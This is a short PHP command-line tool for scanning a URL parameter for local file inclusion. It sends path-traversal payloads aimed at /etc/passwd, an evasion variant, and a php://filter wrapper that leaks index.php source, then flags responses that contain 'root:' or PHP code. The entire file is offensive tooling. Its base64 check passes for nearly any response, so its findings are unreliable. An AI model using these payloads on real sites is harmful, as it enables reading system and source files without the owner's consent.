<?php
if ($argc < 2) {
    echo "[!] Usage: php lfi_scanner.php <target_url_with_parameter>\n";
    exit(1);
}

$target = $argv[1];
$payloads = [
    "../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "..\\..\\..\\..\\..\\..\\etc\\passwd",
    "php://filter/convert.base64-encode/resource=index.php"
];

echo "[*] Testing for LFI on: $target\n";
$vulnerable = false;

foreach ($payloads as $payload) {
    $url = $target . $payload;
    $response = @file_get_contents($url);

    if ($response !== false) {
        if (strpos($response, 'root:') !== false || strpos($response, '<?php') !== false || base64_decode($response) !== false) {
            echo "[!] Potential LFI found with payload: $payload\n";
            $vulnerable = true;
        }
    }
}

if (!$vulnerable) {
    echo "[-] No basic LFI vulnerabilities found.\n";
}
?>
